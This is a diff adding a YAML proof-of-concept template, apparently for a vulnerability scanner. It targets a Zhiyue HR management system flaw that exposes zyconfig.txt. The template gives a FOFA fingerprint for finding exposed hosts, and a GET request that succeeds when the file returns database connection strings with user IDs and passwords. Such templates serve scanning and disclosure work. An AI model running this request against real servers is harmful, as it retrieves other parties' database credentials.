@@ -1,0 +1,15 @@
+id: poc-yaml-zyehr-zyconfig-txt-info-leak
+info:
+  name: 智跃人力资源管理系统 zyconfig.txt 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 智跃人力资源管理系统
+  fofa: body="Login_aspx/GreenStyle/login_bg.png"
+requests:
+- method: GET
+  path: /resource/servs/file/zyconfig.txt
+  expression: status_code == 200 && contains(body,"Data Source=") && contains(body,"User
+    ID=") && contains(body,"PassWord=") && !contains(body,"<") && contains(content_type,"text/plain")
+variables: {}
+transport: http
